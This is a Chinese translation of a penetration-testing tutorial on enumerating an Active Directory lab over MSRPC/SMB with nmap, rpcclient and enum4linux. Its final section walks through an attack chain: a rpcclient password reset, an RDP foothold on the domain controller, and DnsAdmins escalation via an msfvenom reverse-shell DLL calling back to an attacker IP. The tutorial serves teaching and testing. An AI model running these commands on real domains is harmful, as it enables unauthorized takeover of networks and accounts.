---
layout: post
title: 'AD 侦查-MSRPC Over SMB'
date: "2025-05-03T00:39:28Z"
---
AD 侦查-MSRPC Over SMB
====================

> 本文通过 Google 翻译 [AD Recon – MSRPC Over SMB (135/139/445)](https://juggernaut-sec.com/ad-recon-msrpc-over-smb/) 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。

导航
--

*   [0 前言](#id0)
*   [1 MSRPC、NetBIOS、SMB 简介](#id1)
    *   [1.1 MSRPC – Port 135](#id1.1)
        *   [1.1.1 MSRPC Over SMB](#id1.1.1)
    *   [1.2 NetBIOS – Port 139](#id1.2)
    *   [1.3 SMB – Port 445](#id1.3)
        *   [1.3.1 SMB 默认管理共享](#id1.3.1)
*   [2 初始枚举 – nmap 扫描](#id2)
*   [3 脚本枚举 – msrpc-enum](#id3)
*   [4 手动枚举 – rpcclient](#id4)
    *   [4.1 Win10 主机(已加域)的枚举限制](#id4.1)
    *   [4.2 Rpcclient 枚举命令](#id4.2)
        *   [4.2.1 域枚举](#id4.2.1)
        *   [4.2.2 用户枚举](#id4.2.2)
        *   [4.2.3 组枚举](#id4.2.3)
        *   [4.2.4 共享枚举](#id4.2.4)
*   [5 自动枚举 – enum4linux](#id5)
*   [6 示例 – 从服务台到域管理员](#id6)
    *   [6.1 使用 Rpcclient 更改用户密码](#id6.1)
    *   [6.2 立足于 DC](#id6.2)
    *   [6.3 权限提升 – 从域用户到 SYSTEM (DnsAdmins 组)](#id6.3)
*   [7 最后的想法](#id7)

* * *

**

0、前言

**
------------

在这篇文章中，我们将介绍几种可用于枚举 MSRPC over SMB 的工具 ，同时了解 **MSRPC、NetBIOS、SMB** 这三种服务是什么以及它们是如何结合在一起的。

接下来，我们会对一台加域的 win10 主机进行 nmap 扫描，发现主机打开了我们感兴趣的三个端口 135、139、445；然后，使用 **rpcclient** 手动枚举域相关的大量信息；然而，在对 win 10 主机进行域枚举尝试时发现并不能够成功，于是便将精力转向了运气更好的 DC；在 DC 上手动提取了大量的域信息之后，我们另外再了解一个可以自动执行整个手动枚举过程的自动化工具 **enum4linux**；最后，经过检查枚举结果我们发现可以从 DC 上的标准用户权限提升到 SYSTEM！

**

1、MSRPC、NetBIOS、SMB 简介

**
------------------------------

MSRPC 服务使用 IPC 机制（如 命名管道、NetBIOS、Winsock）在客户端和服务器之间建立通信，协议 `IPC$、TCP、UDP、HTTP` 用于提供对服务的访问。因此，我们必须了解这些服务是什么（MSRPC/NetBIOS/命名管道 (SMB)），以及它们在通过 SMB 枚举 MSRPC 时是如何协同工作的。

#### **

1.1、MSRPC – Port 135

**

微软远程过程调用 (MSRPC) 是一种通信协议，它用于向网络中另一台计算机上的程序请求服务。换句话说，MSRPC 调用远程系统上的其它进程，就像是在本地系统中调用它们一样。这是通过“客户端-服务器”或“请求-响应”模型实现的。

> 如果想更详细地了解 RPC 的工作原理，请查看[维基百科](https://zh.wikipedia.org/wiki/%E9%81%A0%E7%A8%8B%E9%81%8E%E7%A8%8B%E8%AA%BF%E7%94%A8)。

RPC 端点映射器可通过 TCP 和 UDP 135 端口、使用空会话或验证会话（TCP 139 和 445）的 SMB (管道)以及监听 TCP 593 端口的 web 服务进行访问。此外，在 49xxx 上打开 RPC 端口也很常见，而这些端口又被称为“随机分配的高 TCP 端口”。

如上所述，如果 SMB 打开，则可以使用命名管道进行 RPC 调用。由于不同的命名管道允许进行不同的操作，因此这对枚举/利用来说非常重要。

###### **

1.1.1、MSRPC Over SMB

**

由于 SMB 在 Windows 主机上几乎始终处于打开状态，因此利用 MSRPC 进行枚举的最常见方式就是通过 SMB 命名管道（通过 `IPC$` 共享）。【大多数工具与 RPC 的交互方式也均以 SMB 命名管道这种方式为主。】

MSRPC Over SMB 使用了许多不同的命名管道，其中包括但不限于以下这些：

*   **\\pipe\\lsarpc**：本地安全机构 (LSA) – 枚举权限、信任关系、SID、策略等。
*   **\\pipe\\samr**：本地 SAM 数据库 – 枚举域/本地用户、域/本地组等。
*   **\\pipe\\svcctl**：服务控制管理器 – 远程创建、启动和停止服务以执行命令
*   **\\pipe\\atsvc**：任务计划程序 – 远程创建计划任务来执行命令
*   **\\pipe\\epmapper**：支持 Windows 管理规范 (WMI) 的分布式组件对象模型 (DCOM) – 通过 WMI 执行远程命令
*   **\\pipe\\winreg**：远程注册表服务 – 用于访问系统注册表

> 虽然 SMB 共享和 RPC Over SMB 都是基于端口 445 展开的服务，但本文的重点是介绍基于 SMB 的 **RPC 工具**。虽然也有一些用于枚举 SMB 共享的工具也利用到了 RPC 的部分功能，但这类工具仍被划入 **SMB 共享工具**。

对于此次的枚举，我们将重点关注 **rpcclient** 和 **enum4linux**。

这些基于 SMB 进行 MSRPC 查询的工具使我们能够收集有关主机和域非常多有用的信息，例如用户名、组、密码策略等。

#### **

1.2、NetBIOS – Port 139

**

网络基本输入/输出系统（Network Basic Input/Output System）是一种应用程序接口，提供与 OSI 模型会话层相关的服务。NetBIOS 的主要用途是允许不同计算机上的应用程序通过局域网（LAN）进行通信。

在现代网络中，NetBIOS 通过 NetBIOS over TCP/IP (NBT) 协议在 TCP/IP 上运行。网络中的每台计算机都有一个 IP 地址和一个 NetBIOS 名称，名称最长为 15 个字符，通常与计算机名称一致。

![image](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123508385-200300716.png)

NetBIOS 通过三个不同的端口提供三种不同的服务；然而，当谈到通过 SMB 进行 MSRPC 时，我们最感兴趣的是面向连接通信的会话服务（端口：139/tcp）。这是因为有些技术或工具利用 NetBIOS 通过 139 端口进行 RPC 枚举，这与 MSRPC over SMB 中利用 445 端口的情况类似。

#### **

1.3、SMB – Port 445

**

服务器消息块 (SMB) 是一种网络文件共享协议，它允许计算机上的应用程序通过网络向服务器读取和写入文件。这意味着通过使用 SMB，用户可以从远程计算机访问文件或其它资源。

SMB 是一种客户端/服务器通信协议，提供对文件、整个目录和网络资源（打印机等）的共享访问，同时它还承载着进程间通信的事务。

在现代 Windows 系统上，SMB 可以直接通过 TCP/IP 在 445 端口上运行。而在其它系统上，我们可能会发现某些服务和应用程序使用的是 139 端口，这意味着 SMB 是与 NetBIOS 一起协同运行的。

多年来，SMB 已发布多个版本，并已实现向后兼容。这意味着运行较新版本 Windows 的设备可以轻松与安装了较旧 Microsoft 操作系统的设备进行通信。

###### 

**1.3.1、SMB 默认管理共享**

关于 MSRPC over SMB 的另一个注意事项是默认的管理共享及其用途，其中最值得注意的是 `IPC$` 共享。

> （1）**管理共享**是隐藏的网络共享，它允许系统管理员远程访问联网系统上的每个磁盘卷。（2）管理共享可能无法永久删除，但可以禁用。（3）没有管理员权限的用户无法访问管理共享。【注：工作组环境下，只有 administrator 用户有权访问管理共享；域环境下，只有域管理组的用户有权访问。】

系统默认管理共享通常如下：

*   `ADMIN$`：用于远程管理计算机。
*   `C$`：系统上的每个磁盘卷都被作为管理共享以进行文件共享。
*   `IPC$`：共享命名管道的资源，这些管道对于程序之间的通信至关重要，例如远程管理计算机或查看共享资源。

现在我们已经对 MSRPC、NetBIOS、SMB 的工作原理以及 MSRPC 如何利用这两种服务在客户端和服务器之间建立通信有了一定的了解，接下来就让我们开始枚举吧！

**

2、初始枚举 – nmap 扫描

**
------------------------

首先，假设我们有一台 Windows 10 机器，其 IP 地址为 172.16.1.200，然后使用 **nmap** 对其进行了 TCP 扫描。

    nmap -A -sV -sC -T4 172.16.1.200 -p- -oN tcp_full.nmap
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352599-851768931.png)

从上面的输出可以看到，我们感兴趣的 135、139 和 445 端口是开放的，同时还有高 RPC 端口，接下来是时候开始枚举它们了。

在开始使用 rpcclient 和 enum4linux 进行枚举之前，我们先使用 nmap 脚本来快速查看一下吧。

**

3、脚本枚举 – msrpc-enum

**
---------------------------

在上一篇有关 MSRPC 枚举的[文章](https://www.cnblogs.com/kqdssheng/p/18852342)中，我们介绍了如何使用 rpcdump.py 工具去转储 RPC 端点。其实 nmap 也是可以转储的，而两者唯一的区别是：nmap 脚本是使用 445 端口进行的枚举，而非 135 端口。

    nmap -A -sV -sC -Pn --script=msrpc-enum 172.16.1.200 -p445
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352193-805090075.png)

正如上面所看到的，当目标是已加入域的 Windows 10 主机时，匿名访问被拒绝。这意味着，我们需要找到凭证才能进行命名管道的枚举。

> 需要注意的是，Windows 10 1709 及更高版本和 Server 2019 默认不允许匿名访问。点击[此处](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default "这里")以了解更多。

为了展示 nmap 脚本可以转储 RPC 端点的功能，假设我们已获得了一个用户凭证。

**vcreed：Dfaster1！23**

    nmap -A -sV -sC -Pn --script=msrpc-enum 172.16.1.200 -p445 --script-args smbusername='vcreed',smbpassword='Dfaster1!23',smbdomain='juggernaut.local'
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353002-589327401.png)

nmap 输出的结果与使用 rpcdump.py 输出的结果大致相同，唯一的区别在于：**nmap 使用 445 端口，而在本例中该端口拒绝匿名访问；而 rpcdump.py 使用 135 端口，并且不需要凭据即可提取相同的信息。**

好了，既然我们已经看到了这一点，接下来，就让我们继续讨论更有趣的 RPC 枚举 – rpcclient。

**

4、手动枚举 – rpcclient

**
--------------------------

**rpcclient** 是一款优秀的 RPC 枚举工具，是 Samba 套件的一部分。它用于在建立 SMB 会话后通过命名管道（SAMR、LSARPC、LSARPC-DS 接口）与 MSRPC 进行交互。

通过 rpcclient 我们可以枚举许多信息，例如 **系统信息、操作系统信息、用户信息、组信息等**；此外，根据传递给 rpcclient 的帐户权限，我们还可以执行一些管理任务，例如 **更改用户密码、创建新的域用户等**。

由于 rpcclient 是基于 SMB 进行的访问，因此该工具的使用通常需要提供用户凭证才能开始。

> 尽管默认情况下匿名访问是被禁用的，但仍然值得检查它是否已启用。

可以使用以下命令来测试匿名访问：

    rpcclient 172.16.1.200 -N
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352603-1039249495.png)

正如预期所料，当尝试在 Windows 10 主机上建立匿名会话时，我们被拒绝访问。

依旧使用上面已获得的凭证，让我们使用它们来建立一个经过验证的会话。

    rpcclient -U 'juggernaut.local/vcreed%Dfaster1!23' 172.16.1.200
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353023-1003374297.png)

Perfect！出现 rpcclient 提示符，说明会话已成功建立，接下来就让我们来看一些有用命令吧。

#### **

4.1、Win10 主机(已加域)的枚举限制

**

由于 Windows 10 机器已加入域，因此我们假设自己可以通过该主机查询域信息，类似于我们在建立立足点后使用 net 命令查询域的方式一样。

但不幸的是，事实并非如此。例如，虽然我们可以通过 srvinfo 命令获取到信息，但那是由于系统信息属于本机信息而非域信息。

    srvinfo
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352681-1768641285.png)

当我们尝试收集有关该域的任何信息时，会提示错误。

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352852-1049378062.png)

此外，rpcclient 没有枚举本地用户/组的命令，因此对于 Windows 10 主机来说它不是很有用。

因此，我们将把重点转移到 DC 上以进行域枚举。

    rpcclient -U 'juggernaut.local/vcreed%Dfaster1!23' 172.16.1.5
    
    srvinfo
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123355066-170091891.png)

从两个 srvinfo 的输出中，我们可以看到操作系统版本是 10，这意味着这些机器可能运行的是 Windows 10、Windows 11、Server 2016、Server 2019 或 Server 2022。而 DC 实际上运行的是 Server 2019。

#### **

4.2、Rpcclient 枚举命令

**

对于 rpcclient 的枚举，我们将**侧重于通过低权限用户访问，而不是管理员访问**。因为有了管理员权限，可以做的事情有很多。但我们更想知道的是，作为标准用户可以枚举的信息能有多少。我们希望找到一些有用的东西，以帮助获得立足点，或在建立立足点后提升权限。

下面我们将把 rpcclient 内置命令分成这几个部分：**域枚举、用户枚举、组枚举、共享枚举和其它枚举**，来逐一介绍。

###### **

4.2.1、域枚举

**

首先列举与目标相关的域的数量。

    enumdomains
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354820-1760614796.png)

Juggernaut 是唯一的域，这意味着我们可以使用以下命令来收集有关它的一些概览信息：

    querydominfo
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353999-669713834.png)

输出提供了有关用户、组、别名的数量以及是否强制注销等信息。

接下来，查看密码策略，这对于设置有针对性的暴力破解或密码喷洒攻击很有用。

    getdompwinfo
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354529-2034306848.png)

Nice！默认密码策略已应用，要求最小长度为 7 个字符。此外，其中三个字符必须包含小写字母、大写字母、数字和/或特殊字符。

另一个很酷的东西是可以获取应用于整个域的特权列表。

> 注：这些特权是整个域所有用户的所有特权的综合，并非当前用户 vcreed 所拥有的特权。

    enumprivs
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123355743-794041729.png)

接下来，我们要抓取的是域 SID，它只是一个用于跟踪对象的唯一安全标识符。

> 域中的所有内容都是对象，并且所有对象都分配有一个 RID，这是另一种唯一（相对）标识符。域 SID+RID 的组合为域中的每个对象提供了唯一标识符 (SID)。

例如，可以使用以下命令来获取域 SID：

    lookupdomain juggernaut
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353612-1699544491.png)

或者，使用另一个命令来获取相同的信息：

    lsaquery
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353945-6138869.png)

除了获取域 SID 之外，还可以获取属于 LSA 域用户和组的 SID 列表。

    lsaenumsid
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354339-291030056.png)

现在我们可以获取这些 SID 并使用 **lookupsids** 命令检查它们：

    lookupsids S-1-5-21-2365897340-51848609-3160590671-1121
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354322-1590923452.png)

最后，可以使用以下命令获取应用于各个安全组的 ACE。

    lsaquerysecobj
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354354-985022046.png)

同样地，要确定这些是哪些安全组，可以使用 lookupsids 命令检查 SID 。

    lookupsids S-1-5-7
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354395-1420567285.png)

###### **

4.2.2、用户枚举

**

有一个很棒的命令，我们可以立即使用，它提供了所有域用户及其十六进制 RID 的列表。

    enumdomusers
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354051-2038396331.png)

我们可以尝试一个很酷的技巧，就是转储这个列表到 users.txt 文件中。

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354393-321795293.png)

然后应用一些技巧，我们将得到一个用户列表，它可以用于枚举、暴力破解等。

    cat users.txt | tr '[\]' ' ' | awk '{print $2}'
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354123-1855232291.png)

此外，我们还可以使用另一个命令来转储所有域用户的列表，但这个命令有点不同，因为它还包含着其它信息，如“描述”（而其中可能会包含有密码）。

    querydispinfo
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354541-466029725.png)

获取到用户列表后，可以使用 queryuser 命令单独收集每个用户的其它信息。如 当前的用户：

    queryuser vcreed
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354449-848852457.png)

提供的用户信息有许多，其中包括密码信息甚至错误的密码计数，这在执行密码喷洒攻击时很有用。

接下来，我们可以通过在以下命令中提供 RID 来查询每个用户所属的所有组：

    queryusergroups 0x451
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354383-986247827.png)

现在可以查询组 RID 来查看用户属于哪些组。

    querygroup 0x472
    
    querygroup 0x201
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354543-991288943.png)

有趣的是，除了标准域用户组之外，还可以看到当前用户还是服务台组（自定义组）的成员。

要枚举每个用户的 SID，我们可以使用 lookupnames 命令。

    lookupnames vcreed
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354534-850699016.png)

最后，可以通过以下命令获取用户特定的密码策略信息：

    getusrdompwinfo 0x451
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354195-1617116049.png)

###### **

4.2.3、组枚举

**

就像我们在用户枚举中看到的一样，还有一个很棒的命令，可以用它来提供所有域组及其十六进制 RID 的列表。

    enumdomgroups
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123352511-1767107770.png)

在列出的众多组中，非标准组我们需要特别留意。

DC 上还存在一组额外的组，即内置组。我们可以列出所有这些组以及它们的十六进制 RID，如下所示：

    enumalsgroups builtin
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123355547-1134811677.png)

正如之前在用户枚举部分看到的，我们可以根据十六进制 RID 值查询任何组。

    querygroup 0x200
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354500-1005021356.png)

这里我们可以看到有两个用户位于域管理员组中。其中一个很可能是内置管理员帐户，这意味着另一个用户帐户具有管理员权限。

> 不幸的是，无法使用 **querygroup** 命令或其它命令来查询**内置组**的信息。

发现有两个用户属于 Domain Admins 组后，我们可以使用 **querygroupmem** 命令找出它们是谁。

    querygroupmem 0x200
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354545-603484249.png)

通过此命令，我们能够获取到 Domain Admins 组中的两个用户的 RID。现在我们可以快速检查这些用户是谁。

    queryuser 0x1f4
    
    queryuser 0x452
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354528-1118655201.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354536-264773033.png)

正如预期的那样，其中一个帐户是内置管理员帐户，而另一个帐户是域用户：**nessex**。这是一个重大的发现！

最后，我们可以使用 lookupnames 命令以枚举用户 SID 的方式枚举组 SID 。

    lookupnames 'Domain Admins'
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354221-491400917.png)

###### **

4.2.4、共享枚举

**

最后一个例子，我们将枚举共享。说到枚举共享，有两个命令可以显示共享。其中一个显示所有共享，另一个显示除默认共享之外的所有共享。由于只有三个管理共享，因此最好直接使用显示所有共享的命令。

    netshareenumall
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353205-2034959683.png)

从上面可以看到，总共六个共享，其中三个是管理共享。

> 另一个排除默认管理共享的命令是 netshareenum。

此外，在提取共享列表之后，我们可以检查与上面列出的任何共享相关的权限（ACE）。例如：

    netsharegetinfo confidential
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354389-1361750094.png)

输出告诉我们有关此共享的一些重要信息，例如实际系统上的文件路径和直接应用于此文件夹的 ACE。

此外，ACE 为我们提供了 SID 以及应用于 SID 所属用户或组的给定权限。

与之前查找 SID 的方式类似，我们可以快速检查这些 SID，看看它们属于谁/什么。如果我们用空格分隔 SID，就可以用一个命令列举所有 SID：

    lookupsids S-1-1-0 S-1-5-21-2365897340-51848609-3160590671-1114 S-1-5-21-2365897340-51848609-3160590671-500 S-1-5-32-544 S-1-5-21-2365897340-51848609-3160590671-513
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353925-1974577688.png)

我们想要看到的写访问权限，虽然在这个例子中没能看到，但这证明了 rpcclient 对于攻击者来说确实是一个非常强大的工具。

接下来，我们将介绍另一个很棒的工具，它可以自动执行刚刚我们在 rpcclient 中看到的大量的 MSRPC 枚举，甚至更多！

**

5、自动枚举 – enum4linux

**
---------------------------

现在，我们已经了解了如何使用 rpcclient 手动枚举有关域的大量有用信息。接下来，让我们将注意力转移到自动工具 enum4linux 上，它可以为我们完成大部分相同的枚举工作，但不是 rpcclient 手动枚举的全部。

> Enum4linux 预先与 Kali 打包在一起，但如果由于某种原因您没有它，您可以从[这里](https://github.com/CiscoCXSecurity/enum4linux/tree/master "这里")下载它。

Enum4linux 是一个功能强大的工具，可以枚举 MS-RPC、LDAP、NBT-NS。之所以能做到这一点，是因为该脚本本质上只是这四个 Samba 工具的封装：nmblookup、net、**rpcclient**、smbclient。

由于该脚本使用了多种工具，因此它能收集到许多 rpcclient 无法收集到的信息。

运行 enum4linux 时可以使用许多不同的选项，但对于此示例，我们将使用 -a 选项。

    enum4linux -h
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353784-1708697957.png)

Great！现在我们已经了解了所有可用的选项，接下来就运行试试吧。

> 在找到用户凭证之前匿名测试 enum4linux 是一个好习惯。

    enum4linux -a -u 'juggernaut.local\vcreed' -p 'Dfaster1!23' 172.16.1.5
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353537-399138928.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353410-1388371655.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353194-1574238819.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353195-1246228337.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353644-968086440.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353880-1607448023.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354963-610188803.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354220-497867201.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353819-818269038.png)

enum4linux 输出的信息量可真大。而且，其中大约 90% 都是使用 rpcclient 收集的。

除了 rpcclient 之外，enum4linux 使用的工具更多枚举更为全面，其好处是可以为我们提供有关本地组和内置组、用户以及组成员的信息。这对我们大有裨益，因为它能显示哪些用户可以通过 RDP 或 WinRM 等方式访问 DC。

**

6、示例 – 从服务台到域管理员

**
------------------------

在上面的枚举中，我们发现了一些可以使用 rpcclient 去利用的潜在提示。

可以看到有一个“Service Desk”组，而当前用户“vcreed”正是该组的成员。通常情况下，当我们发现一个“IT support”类型的**自定义组/用户**名称中包含有 **帮助台-Help Desk、服务台-Service Desk、支持-Support、IT 等** 字样时，该组/用户很有可能拥有一些特殊的权限（如 强制重置密码）。

此外，由于互联网上有许多糟糕的教程，这些权限通常被宽松地应用，不仅为用户提供重置密码的权限，还可能为用户提供更改密码的权限！

如果我们想做的更彻底一点的话，可以使用一个名为**[bloodhound](https://github.com/BloodHoundAD/BloodHound "猎犬")**的工具来确认这个怀疑；然而，对于这个例子，我们假设自己的预感是正确的，即当前用户可以更改其它用户的密码。

这对攻击者来说是一个巨大的突破，因为我们很可能可以更改任何用户的密码，只要它们不在域管理员组中。

> 拥有更改密码权限的标准用户不能够更改管理员用户的密码。

#### **

6.1、使用 Rpcclient 更改用户密码

**

根据 enum4linux 的输出，我们可以看到用户 nessex 是 DA(域管理员)，因此它的密码我们是无法更改的。但是，我们还找到了另外两个用户，它们是**值得关注的群组**的成员，这为在 DC 上获取立足点提供了途径。

我们可以更改 cmarko 的密码，因为它位于远程管理用户组中，可以通过 WinRM 会话访问 DC；或者，我们可以更改 meisenhardt 的密码，因为它位于远程桌面用户组中，可以通过 GUI 会话通过 RDP 访问 DC。

但在这个例子中，我们将使用 mesienhardt 的 GUI 会话，因为这个用户同时也属于 DnsAdmins 组，这很有趣。

首先，我们进入 rpcclient 会话。

    rpcclient -U 'juggernaut.local/vcreed%Dfaster1!23' 172.16.1.5
    

然后，执行以下命令，我们就可以将用户密码更改为任何密码。在这个例子中，我们将保持简单并使用 **Password123**，因为它符合机器的密码策略。

    setuserinfo2 meisenhardt 23 Password123
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353816-1845743075.png)

输出没有错误产生，这表明命令执行成功。

#### **

6.2、立足于 DC

**

为了确认密码更改是否有效，我们可以使用 crackmapexec 去检查新密码。

    crackmapexec smb 172.16.1.5 -u 'meisenhardt' -p 'Password123'
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353990-2141758930.png)

有 **\[+\]** 提示则表示凭证正确，密码更改确实成功了！

由于该用户属于 RDP 组，因此我们现在能够启动 RDP 会话并在 DC 上获得立足点。

    sudo xfreerdp /u:meisenhardt /p:Password123 /d:juggernaut.local /v:172.16.1.5 +clipboard
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353815-1722313532.png)

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353400-216530085.png)

#### **

6.3、权限提升 – 从域用户到 SYSTEM (DnsAdmins 组)

**

由于用户 meiseinhardt 也是 DnsAdmins 组中的成员，因此我们可以继续利用此权限以从标准用户升级到 SYSTEM。

首先，我们需要一个恶意 DLL 载荷文件。

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f dll > dns.dll
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353707-2030217206.png)

接下来我们需要将文件传输到受害者主机，或将其托管在共享目录中。为了简单起见，我们将其托管在共享目录中。

    smbserver.py share $(pwd) -smb2support
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123353985-339629571.png)

接下来，在攻击机器上启动一个 netcat 监听器，以便捕获 SYSTEM shell 反向连接。

    nc -nvlp 443
    

回到 RDP 会话，运行以下命令。该命令将在注册表中添加一个条目（指向恶意 DLL），然后重新启动服务。

    dnscmd \\Juggernaut-DC /config /serverlevelplugindll \\172.16.1.30\share\dns.dll
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354343-655653716.png)

使用下面命令确认注册表项已创建：

    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123355226-1385274515.png)

Perfect！一切看起来都很棒。现在，让我们快速重启服务。

    sc.exe \\Juggernaut-DC stop dns
    
    sc.exe \\Juggernaut-DC start dns
    

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354581-1767772663.png)

然后回到监听器，可以看到捕获了一个 SYSTEM shell！

![](https://img2024.cnblogs.com/blog/1503193/202505/1503193-20250502123354017-1104901300.png)

Amazing！综上所述，通过对 MSRPC 的初步枚举，我们收集到了足够的信息，然后水平移动到了另一个用户，最后成功提升到了 SYSTEM 权限。

**

7、最后的想法

**
---------------

**枚举具有很强的周期性**。作为攻击者，我们应该始终尝试以匿名方式攻击所有的 AD 服务，万一走运了呢。我们希望有一项服务能允许匿名访问，并提供一些获取用户凭据的方法。一旦获得凭据，我们就应该再绕回来，在那些我们匿名访问失败的服务上继续进行枚举测试。

从以上内容可以看出，MSRPC 枚举对于攻击者来说是有多么重要。利用 rpcclient 和 enum4linux 等工具，我们可以远程提取大量的信息；但是，能够消化这些信息也很重要。如示例中所展示的那样，通过像攻击者一样思考，我们能够利用 enum4linux 的输出将我们的权限提升到最高级别（DC 上的 SYSTEM）。